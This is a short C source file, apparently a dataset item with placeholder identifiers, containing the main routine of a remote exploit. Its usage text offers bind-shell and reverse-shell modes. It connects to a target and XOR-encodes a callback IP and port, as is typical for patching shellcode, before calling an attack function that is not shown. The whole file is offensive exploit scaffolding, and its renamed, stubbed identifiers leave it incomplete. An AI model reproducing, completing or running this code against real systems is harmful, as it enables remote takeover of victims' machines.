
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {unsigned short sin_port; struct in_addr sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int,struct sockaddr*,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,unsigned long,unsigned short,int) ;
 int FUNC_4 (int ,char*,char*,...) ;
 struct hostent* FUNC_5 (char*) ;
 unsigned short FUNC_6 (int) ;
 unsigned long FUNC_7 (char*) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int ,int ,int ) ;
 int VAR_3 ;

int
FUNC_10 ( int VAR_4, char* VAR_5[] )
{
 int VAR_6;
 unsigned long VAR_7;
 unsigned short VAR_8;
 struct sockaddr_in VAR_9;
 struct hostent* VAR_10;

 if ( VAR_4 != 2 )
  if ( VAR_4 != 4 )
   { FUNC_4 ( VAR_3, "Usage\n-----\n[bindshell] %s <ip>\n[reverseshell] %s <ip> <cbip> <cbport>\n", VAR_5[0], VAR_5[0] ); FUNC_2 ( 1 ); }

 if ( ( VAR_10 = FUNC_5 ( VAR_5[1] ) ) == ((void*)0) )
  { FUNC_4 ( VAR_3, "Cannot resolve hostname: %s\n", VAR_5[1] ); FUNC_2 ( 1 ); }

 VAR_9.sin_family = VAR_0;
 VAR_9.sin_addr = * ( ( struct in_addr * ) VAR_10->h_addr );
 VAR_9.sin_port = FUNC_6 ( VAR_1 );

 VAR_6 = FUNC_9 ( VAR_0, VAR_2, 0 );
 FUNC_8 ( "connecting to %s:%u...", VAR_5[1], VAR_1 );
 if ( FUNC_1 ( VAR_6, ( struct sockaddr * ) &VAR_9, sizeof ( struct sockaddr ) ) == -1 )
  { FUNC_8 ( "failed!\n" ); FUNC_2 ( 1 ); }
 FUNC_8 ( "ok!\n" );

 if ( VAR_4 == 4 )
 {
  VAR_7 = FUNC_7 ( VAR_5[2] ) ^ ( unsigned long ) 0x99999999;
  VAR_8 = FUNC_6 ( FUNC_0 ( VAR_5[3] ) ) ^ ( unsigned short ) 0x9999;
  FUNC_3 ( VAR_6, VAR_7, VAR_8, 0 );
 }
 else
  FUNC_3 ( VAR_6, ( unsigned long ) ((void*)0), ( unsigned short ) ((void*)0), 1 );
}
